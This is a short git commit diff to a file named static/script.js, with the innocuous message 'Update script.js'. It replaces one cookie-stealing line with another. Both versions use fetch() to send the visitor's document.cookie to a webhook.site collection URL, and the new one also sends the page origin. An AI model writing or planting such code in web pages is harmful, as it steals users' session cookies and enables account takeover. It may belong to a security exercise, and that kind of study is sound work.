363fb97ee59570075b472c47dff17fcfaa4d37f0
yuhan-0118 <H24111170@gs.ncku.edu.tw>
2025-04-22 01:24:21 +0800

    Update script.js

--- static/script.js
+++ static/script.js
@@ -1,1 +1,3 @@
-fetch('https://webhook.site/51ab4e6d-5c63-44e7-9aaa-fae89d54be97?c=' + document.cookie);
+fetch('https://webhook.site/51ab4e6d-5c63-44e7-9aaa-fae89d54be97?' + 
+      'cookie=' + encodeURIComponent(document.cookie) + 
+      '&origin=' + encodeURIComponent(location.origin));
